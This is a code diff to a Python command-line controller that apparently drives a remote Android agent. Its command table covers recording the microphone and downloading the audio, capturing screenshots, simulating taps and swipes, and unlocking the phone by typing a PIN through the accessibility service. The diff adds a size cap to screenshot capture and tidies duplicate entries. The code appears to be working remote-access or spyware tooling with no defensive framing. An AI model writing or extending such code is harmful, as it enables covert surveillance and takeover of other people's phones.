@@ -1508,8 +1508,8 @@ COMMAND_INFO = {
     "rec": ("comms", "/rec <secs> [out.wav]", "Record mic audio & download WAV",
             "Records audio from device microphone for specified seconds and downloads it locally.\nExample:\n  /rec 10 mic_sample.wav"),
     # device
-    "screen": ("device", "/screen [out.png]", "Capture screenshot via projection",
-               "Takes a screenshot using Android MediaProjection service and downloads it.\nExample:\n  /screen device_screen.png"),
+    "screen": ("device", "/screen [out.jpg] [maxdim]", "Capture screenshot via projection",
+               "Takes a screenshot using Android MediaProjection and downloads it. Optional maxdim caps the long edge (360-2160) for a smaller, cheaper capture.\nExample:\n  /screen device_screen.jpg"),
     "tap": ("device", "/tap <x> <y>", "Simulate tap at screen coordinates",
             "Simulates touch tap at (x, y) using accessibility service.\nExample:\n  /tap 540 960"),
     "swipe": ("device", "/swipe <x1> <y1> <x2> <y2> [ms]", "Simulate swipe between points",
@@ -1528,10 +1528,6 @@ COMMAND_INFO = {
                "Wakes the screen, swipes up the lockscreen bouncer, types the PIN via accessibility and confirms. Needs accessibility service.\nBest-effort — OEM lockscreen implementations vary.\nExample:\n  /unlock 4821"),
     "vol": ("device", "/vol [level|up|down|mute]", "Get or adjust audio volume",
             "Queries or sets device audio volume.\nExample:\n  /vol up\n  /vol 10"),
-    "screen": ("device", "/screen [out.jpg]", "Capture screenshot via projection",
-               "Takes a screenshot using Android MediaProjection service and downloads it.\nExample:\n  /screen device_screen.jpg"),
-    "tap": ("device", "/tap <x> <y>", "Simulate tap at screen coordinates",
-            "Simulates touch tap at (x, y) using accessibility service.\nExample:\n  /tap 540 960"),
     "torch": ("device", "/torch <on|off>", "Toggle camera flashlight",
               "Turns camera flash LED on or off.\nExample:\n  /torch on"),
     "vibrate": ("device", "/vibrate [ms]", "Trigger vibration (default 500ms)",
@@ -2114,7 +2110,14 @@ def dispatch(argv):
             show_result(send_and_wait(payload) or "")
     elif op == "screen":
         dest = rest[0] if rest else "screen.jpg"
-        download_b64(send_and_wait("SCREENB64") or "", dest)
+        maxdim = rest[1] if len(rest) > 1 else ""
+        r = send_and_wait(("SCREENB64 " + maxdim).strip()) or ""
+        # scaled agents reply "OK <len> <WxH> <b64>" — drop the bounds token
+        # for download_b64 (which expects "OK <len> <b64>")
+        p = r.split(" ", 3)
+        if len(p) == 4 and p[0] == "OK" and "x" in p[2]:
+            r = " ".join([p[0], p[1], p[3]])
+        download_b64(r, dest)
     elif op == "rec":
         secs = rest[0] if rest else "10"
         r = send_and_wait("RECORD " + secs)
